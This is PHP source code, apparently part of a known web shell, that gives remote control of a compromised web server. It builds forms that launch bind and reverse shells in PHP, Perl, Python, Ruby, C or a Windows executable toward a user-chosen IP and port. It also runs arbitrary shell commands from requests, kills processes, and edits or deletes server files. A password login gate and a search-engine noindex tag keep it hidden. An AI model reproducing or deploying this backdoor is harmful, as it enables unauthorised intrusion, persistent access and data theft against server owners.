		$rsback["back_php"] = "Reverse Shell <span style=\"font-size:12px;color:#999;\">- php</span>";
		
		if($s_perl){
			$rsbind["bind_pl"] = "Bind Shell <span style=\"font-size:12px;color:#999;\">- perl</span>";
			$rsback["back_pl"] = "Reverse Shell <span style=\"font-size:12px;color:#999;\">- perl</span>";
		}
		if($s_python){
			$rsbind["bind_py"] = "Bind Shell <span style=\"font-size:12px;color:#999;\">- python</span>";
			$rsback["back_py"] = "Reverse Shell <span style=\"font-size:12px;color:#999;\">- python</span>";
		}
		if($s_ruby){
			$rsbind["bind_rb"] = "Bind Shell <span style=\"font-size:12px;color:#999;\">- ruby</span>";
			$rsback["back_rb"] = "Reverse Shell <span style=\"font-size:12px;color:#999;\">- ruby</span>";
		}
		if($s_win){
			$rsbind["bind_win"] = "Bind Shell <span style=\"font-size:12px;color:#999;\">- windows executable</span>";
			$rsback["back_win"] = "Reverse Shell <span style=\"font-size:12px;color:#999;\">- windows executable</span>";
		}
		else{
			$rsbind["bind_c"] = "Bind Shell <span style=\"font-size:12px;color:#999;\">- c</span>";
			$rsback["back_c"] = "Reverse Shell <span style=\"font-size:12px;color:#999;\">- c</span>";
		}
		
		$rslist = array_merge($rsbind,$rsback);
		
		if(!is_writable($cwd)) $s_result .= "<p class=\"rs_result\">Directory ".$cwd." is not writable, please change to a writable one</p>";
		$rs_err = "";
		foreach($rslist as $rstype=>$rstitle){
			$split = explode("_",$rstype);
			if($split[0]=="bind"){
				$rspesan = $rspesana;
				$rsdisabled = "disabled=\"disabled\"";
				$rstarget =	$s_server_ip;
				$labelip = "Server IP";
			}
			elseif($split[0]=="back"){
				$rspesan = $rspesanb;
				$rsdisabled = "";
				$rstarget =	$s_my_ip;
				$labelip = "Target IP";
			}
			if(isset($_REQUEST[$rstype])){
				if(isset($_REQUEST["rshost_".$rstype])) $rshost_ = ss($_REQUEST["rshost_".$rstype]);
				if(isset($_REQUEST["rsport_".$rstype])) $rsport_ = ss($_REQUEST["rsport_".$rstype]);

				if($split[0]=="bind") $rstarget_packed = $rsport_;
				elseif($split[0]=="back") $rstarget_packed = $rsport_." ".$rshost_;

				if($split[1]=="pl") $rscode = $rs_pl;
				elseif($split[1]=="py") $rscode = $rs_py;
				elseif($split[1]=="rb") $rscode = $rs_rb;
				elseif($split[1]=="c") $rscode = $rs_c;
				elseif($split[1]=="win") $rscode = $rs_win;
				elseif($split[1]=="php") $rscode = $rs_php;;
				$buff = rs($rstype,$rstarget_packed,$rscode);
				if($buff!="") $rs_err = "<p class=\"rs_result\">".htmlspecialchars($buff)."</p>";
			}
			$s_result .= "<div class=\"mybox\"><h2>".$rstitle."</h2>
			<form action=\"" . $_SERVER['PHP_SELF'] . "?rs\" method=\"post\" />
			<table class=\"myboxtbl\">
			<tr><td style=\"width:100px;\">".$labelip."</td><td><input ".$rsdisabled." style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rshost_".$rstype."\" value=\"".$rstarget."\" /></td></tr>
			<tr><td>Port</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rsport_".$rstype."\" value=\"".$rsport."\" /></td></tr>
			</table>
			<input type=\"submit\" name=\"".$rstype."\" class=\"inputzbut\" value=\"Go !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
			&nbsp;&nbsp;<span>".$rspesan."</span>
			<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
			</form>
			</div>";
		}
		$s_result = $rs_err.$s_result;
	} // view file
	elseif(isset($_REQUEST['view'])){
		$f = ss($_REQUEST['view']);
		if(isset($fnew) && (trim($fnew)!="")) $f = $fnew;
		$owner = "";
		if(is_file($f)){
			if(!$s_win && $s_posix){
				$name = posix_getpwuid(fileowner($f));
				$group = posix_getgrgid(filegroup($f));
				$owner = "<tr><td>Owner</td><td>".$name['name']."<span class=\"gaya\"> : </span>".$group['name']."</td></tr>";
			}
			$filn = basename($f);
			$dlfile = get_archiver_available();
			$dlfile = str_replace("__dlpath__",$filn,$dlfile);
			$dlfile = str_replace("__dlcwd__",$cwd,$dlfile);
			$s_result .= "<table class=\"viewfile\" style=\"width:100%;\">
			<tr><td style=\"width:140px;\">Filename</td><td><span id=\"".cs($filn)."_link\">".$f."</span>
			<form action=\"" . $_SERVER['PHP_SELF'] . "?d=".$cwd."&amp;view=".$f."\" method=\"post\" id=\"".cs($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
				<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
				<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
				<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
				<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\"
				onclick=\"tukar('".cs($filn)."_link','".cs($filn)."_form');\" />
			</form>
			</td></tr>
			<tr><td>Size</td><td>".gs($f)."</td></tr>
			<tr><td>Permission</td><td>".gp($f)."</td></tr>
			".$owner."
			<tr><td>Create time</td><td>".date("d-M-Y H:i",filectime($f))."</td></tr>
			<tr><td>Last modified</td><td>".date("d-M-Y H:i",filemtime($f))."</td></tr>
			<tr><td>Last accessed</td><td>".date("d-M-Y H:i",fileatime($f))."</td></tr>
			<tr><td>Actions</td><td>
			<a href=\"?d=".$cwd."&amp;edit=".$f."\">edit</a> |
			<a href=\"javascript:tukar('".cs($filn)."_link','".cs($filn)."_form');\">rename</a> |
			<a href=\"?d=".$cwd."&amp;delete=".$f."\">delete</a> ".$dlfile."
			</td></tr>
			<tr><td>View</td><td>
			<a href=\"?d=".$cwd."&amp;view=".$f."&amp;type=text\">text</a> |
			<a href=\"?d=".$cwd."&amp;view=".$f."&amp;type=code\">code</a> |
			<a href=\"?d=".$cwd."&amp;view=".$f."&amp;type=image\">image</a></td></tr>
			</table>
			";
			$t = "";
			$iinfo = @getimagesize($f);
			if(substr($filn,-3,3) == "php") $t = "code";
			if(is_array($iinfo)) $t = 'image';

			if(isset($_REQUEST['type'])) $t = ss($_REQUEST['type']);

			if($t=="image"){
				$width = (int) $iinfo[0];
				$height = (int) $iinfo[1];
				$imginfo = "Image type = ( ".$iinfo['mime']." )<br />
					Image Size = <span class=\"gaul\">( </span>".$width." x ".$height."<span class=\"gaul\"> )</span><br />";
				if($width > 800){
					$width = 800;
					$imglink = "<p><a href=\"?d=".$cwd."&amp;img=".$filn."\" target=\"_blank\">
					<span class=\"gaul\">[ </span>view full size<span class=\"gaul\"> ]</span></a></p>";
				}
				else $imglink = "";

				$s_result .= "<div class=\"viewfilecontent\" style=\"text-align:center;\">".$imglink."
					<img width=\"".$width."\" src=\"?d=".$cwd."&amp;img=".$filn."\" alt=\"\" style=\"margin:8px auto;padding:0;border:0;\" /></div>";

			}
			elseif($t=="code"){
				$s_result .= "<div class=\"viewfilecontent\">";
				$file = wordwrap(file_get_contents($f),160,"\n",true);
				$buff = highlight_string($file,true);
				$old = array("0000BB","000000","FF8000","DD0000", "007700");
				$new = array("4C83AF","888888", "87DF45", "EEEEEE" , "FF8000");
				$buff = str_replace($old,$new, $buff);
				$s_result .= $buff;
				$s_result .=  "</div>";
			}
			else {
				$s_result .= "<pre style=\"padding: 3px 8px 0 8px;\" class=\"viewfilecontent\">";
				$s_result .=  str_replace("<","&lt;",str_replace(">","&gt;",(wordwrap(file_get_contents($f),160,"\n",true))));
				$s_result .=   "</pre>";
			}
		}
		elseif(is_dir($f)){
			chdir($f);
			$cwd = cp(getcwd());
			$s_result .= showdir($cwd);
		}

	} // edit file
	elseif(isset($_REQUEST['edit'])){
		$f = ss($_REQUEST['edit']);
		$fc = "";
		$fcs = "";

		if(is_file($f))	$fc = file_get_contents($f);
		if(isset($_REQUEST['fcsubmit'])){
			$fc = ssc($_REQUEST['fc']);
			if($filez = fopen($f,"w")){
				$time = date("d-M-Y H:i",time());
				if(fwrite($filez,$fc)!==false) $fcs = "file saved <span class=\"gaya\">@</span> ".$time;
				else $fcs = "failed to save";
				fclose($filez);
			}
			else $fcs = "permission denied";
		}
		$s_result .= "	<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\">
				<textarea id=\"fc\" name=\"fc\" class=\"evalcode\">".htmlspecialchars($fc)."</textarea>
				<p><input type=\"text\" class=\"inputz\" style=\"width:98%;\" name=\"edit\" value=\"".$f."\" /></p>
				<p><input type=\"submit\" name=\"fcsubmit\" class=\"inputzbut\" value=\"Save !\" style=\"width:120px;height:30px;\" />
				&nbsp;&nbsp;".$fcs."</p>
				<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
				</form>
							";

	} // task manager
	elseif(isset($_REQUEST['ps'])){
		$buff = "";
		// kill process specified by pid
		if(isset($_REQUEST['pid'])){
			$p = ss($_REQUEST['pid']);
			if(function_exists("posix_kill")) $buff = (posix_kill($p,'9'))? "Process with pid ".$p." has been successfully killed":"Unable to kill process with pid ".$p;
			else{
				if(!$s_win) $buff = exe("kill -9 ".$p);
				else $buff = exe("taskkill /F /PID ".$p);
			}
		}

		if(!$s_win) $h = "ps aux";
		else $h = "tasklist /V /FO csv";
		$wcount = 11;
		$wexplode = " ";
		if($s_win) $wexplode = "\",\"";

		
		$res = exe($h);
		if(trim($res)=='') $s_result = "<p class=\"rs_result\">Error getting process list</p>";
		else{
			if($buff!="") $s_result = "<p class=\"rs_result\">".$buff."</p>";
			$s_result .= "<table class=\"explore sortable\">";
			if(!$s_win) $res = preg_replace('#\ +#',' ',$res);

			$psarr = explode("\n",$res);
			$fi = true;
			$tblcount = 0;

			$check = explode($wexplode,$psarr[0]);
			$wcount = count($check);

			foreach($psarr as $psa){
				if(trim($psa)!=''){
					if($fi){
						$fi = false;
						$psln = explode($wexplode,$psa,$wcount);
						$s_result .= "<tr><th>action</th>";
						foreach($psln as $p){
							$s_result .= "<th>".trim(trim(strtolower($p)),"\"")."</th>";
						}
						$s_result .= "</tr>";
					}
					else{
						$psln = explode($wexplode,$psa,$wcount);
						$s_result .= "<tr>";
						$tblcount = 0;
						foreach($psln as $p){
							if(trim($p)=="") $p = "&nbsp;";
							if($tblcount == 0){
								$s_result .= "<td style=\"text-align:center;\"><a href=\"?ps&amp;d=".$cwd."&amp;pid=".trim(trim($psln[1]),"\"")."\">kill</a></td>
										<td style=\"text-align:center;\">".trim(trim($p),"\"")."</td>";
								$tblcount++;
							}
							else{
								$tblcount++;
								if($tblcount == count($psln)) $s_result .= "<td style=\"text-align:left;\">".trim(trim($p), "\"")."</td>";
								else $s_result .= "<td style=\"text-align:center;\">".trim(trim($p), "\"")."</td>";
							}
						}
						$s_result .= "</tr>";
					}
				}
			}
			$s_result .= "</table>";
		}
	}
	else{
		if(isset($_REQUEST['cmd'])){
			$cmd = ss($_REQUEST['cmd']);
			if(strlen($cmd) > 0){
				if(preg_match('#^cd(\ )+(.*)$#',$cmd,$r)){
					$nd = trim($r[2]);
					if(is_dir($nd)){
						chdir($nd);
						$cwd = cp(getcwd());
						$s_result .= showdir($cwd);
					}
					elseif(is_dir($cwd.$nd)){
						chdir($cwd.$nd);
						$cwd = cp(getcwd());
						$s_result .= showdir($cwd);
					}
					else $s_result .= "<pre>".$nd." is not a directory"."</pre>";
				}
				else{
					$s_r = htmlspecialchars(exe($cmd));
					if($s_r != '') $s_result .= "<pre>".$s_r."</pre>";
					else $s_result .= showdir($cwd);
				}
			}
			else $s_result .= showdir($cwd);
		}
		else{
			if(!empty($dirmsg)) $s_result .= "<p class=\"rs_result\">".$dirmsg."</p>";
			$s_result .= showdir($cwd);
		}
	}

	// print useful info
	$s_info  = "<table class=\"headtbl\"><tr><td>".$s_system."</td></tr>";
	$s_info .= "<tr><td>".$s_software."</td></tr>";
	$s_info .= "<tr><td>server ip : ".$s_server_ip."<span class=\"gaya\"> | </span>your   ip : ".$s_my_ip;
	$s_info .= "<span class=\"gaya\"> | </span> Time @ Server : ".date("d M Y H:i:s",time());
	$s_info .= "
		</td></tr>
		<tr><td style=\"text-align:left;\">
			<table class=\"headtbls\"><tr>
			<td>".trim($letters)."</td>
			<td>
			<span id=\"chpwd\">
			&nbsp;<a href=\"javascript:tukar('chpwd','chpwdform')\">
			<img height=\"16px\" width=\"16px\" src=\"" . $_SERVER['PHP_SELF'] . "?favicon\" alt=\"Change\" style=\"vertical-align:middle;margin:6px 0;border:0;\" />
			&nbsp;&nbsp;</a>".swd($cwd)."</span>
			<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\" style=\"margin:0;padding:0;\">
			<span class=\"sembunyi\" id=\"chpwdform\">
			&nbsp;<a href=\"javascript:tukar('chpwdform','chpwd');\">
			<img height=\"16px\" width=\"16px\" src=\"" . $_SERVER['PHP_SELF'] . "?favicon\" alt=\"Change\" style=\"vertical-align:middle;margin:6px 0;border:0;\" />
			</a>&nbsp;&nbsp;
			<input type=\"hidden\" name=\"d\" class=\"inputz\" style=\"width:300px;\" value=\"".cp($cwd)."\" />
			<input type=\"text\" name=\"view\" class=\"inputz\" style=\"width:300px;\" value=\"".$cwd."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"submit\" value=\"view file / folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('chpwdform','chpwd');\" />
			</form>
			</span>
			</td></tr>
			</table>
		</td></tr>
		</table>";
}
?><!DOCTYPE html>
<html>
<head>
<title><?php echo $s_title; ?></title>
<meta name="robots" content="noindex, nofollow, noarchive">
<link rel="SHORTCUT ICON" href="<?php echo $_SERVER['PHP_SELF']."?favicon"; ?>">
<link href="http://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet" type="text/css">
<style type="text/css"><?php echo gzinflate(base64_decode($style)); ?></style>
<script type="text/javascript" src="<?php echo $_SERVER['PHP_SELF']."?sorttable"; ?>"></script>
<script type="text/javascript">
window.onload=function(){
	init();
}
function init(){<?php if(isset($_REQUEST['cmd'])) echo "if(document.getElementById('cmd')) document.getElementById('cmd').focus();"; ?>}
function tukar(l,b){
	if(document.getElementById(l)) document.getElementById(l).style.display = 'none';
	if(document.getElementById(b)) document.getElementById(b).style.display = 'block';
	if(document.getElementById(l + '_')) document.getElementById(l + '_').focus();
}
function toggle(b){
	if(document.getElementById(b)){
		if(document.getElementById(b).style.display == 'block') document.getElementById(b).style.display = 'none';
		else document.getElementById(b).style.display = 'block'
	}
}
function clickcmd(){
	var buff = document.getElementById('cmd');
	if(buff.value == '- shell command -') buff.value = '';
}
function download(what){
	what.form.submit();
	what.selectedIndex=0;
}
function cancelBubble(e) {
	var evt = e ? e:window.event;
	if(evt.stopPropagation) evt.stopPropagation();
	if(evt.cancelBubble!=null) evt.cancelBubble = true;
}
function xplgo(target){
	var t = (document.all) ? document.selection.createRange().text : document.getSelection();
	if(t.toString().length==0) window.location='?d='+target;
}
</script>
</head>
<body>
<table id="main"><tr><td><?php if($s_auth){ ?>
	<div><table id="header"><tr><td style="width:80px;"><table><tr><td><h1><a href="?"><?php echo $s_name; ?></a></h1></td></tr><tr><td style="text-align:right;"><div class="ver"><?php echo $s_ver; ?></div></td></tr></table></td>
	<td><div class="headinfo"><?php echo $s_info; ?></div></td></tr></table>
	</div>
	<div style="clear:both;"></div>
	<div id="menu">
		<table style="width:100%;"><tr>
		<td><a href="?&d=<?php echo $cwd; ?>" title="Explorer"><div class="menumi">xpl</div></a></td>
		<td><a href="?ps&d=<?php echo $cwd; ?>" title="Display process status"><div class="menumi">ps</div></a></td>
		<td><a href="?eval&d=<?php echo $cwd; ?>" title="Execute code"><div class="menumi">eval</div></a></td>
		<td><a href="?info&d=<?php echo $cwd; ?>" title="Information about server"><div class="menumi">info</div></a></td>
		<td><a href="?db&d=<?php echo $cwd; ?>" title="Connect to database"><div class="menumi">db</div></a></td>
		<td><a href="?rs&d=<?php echo $cwd; ?>" title="Remote Shell"><div class="menumi">rs</div></a></td>
		<td style="width:100%;padding:0 0 0 6px;">
		<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post"><span class="prompt"><?php echo $s_prompt; ?></span>
		<input id="cmd" onclick="clickcmd();" class="inputz" type="text" name="cmd" style="width:70%;" value="<?php
if(isset($_REQUEST['cmd'])) echo "";
else echo "- shell command -";
?>" />
		<noscript><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:80px;" /></noscript>
		<input type="hidden" name="d" value="<?php echo $cwd; ?>" />
		</form>
		</td>
		</tr>
		</table>
	</div>
	<div id="content" id="box_shell">
		<div id="result"><?php echo $s_result; ?></div>
	</div><?php }
else{ ?>
	<div style="width:100%;text-align:center;">

	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
	<img src="?favicon" style="margin:2px;vertical-align:middle;" />
	<?php echo $s_name; ?>&nbsp;<span class="gaya"><?php echo $s_ver; ?></span><input id="login" class="inputz" type="password" name="login" style="width:120px;" value="" />
	<input class="inputzbut" type="submit" value="Go !" name="submitlogin" style="width:80px;" />
	</form>
	</div>

<?php } ?>
</td></tr></table>
<p class="footer">Jayalah Indonesiaku &copy;<?php echo date("Y",time())." ".$s_name; ?> ( <?php 
$mtime = explode(" ",microtime());
$s_end = (float)$mtime[0] + (float)$mtime[1]; // to calculate script execution time
echo round($s_end-$s_start,3); ?> secs )</p>
</body>
</html>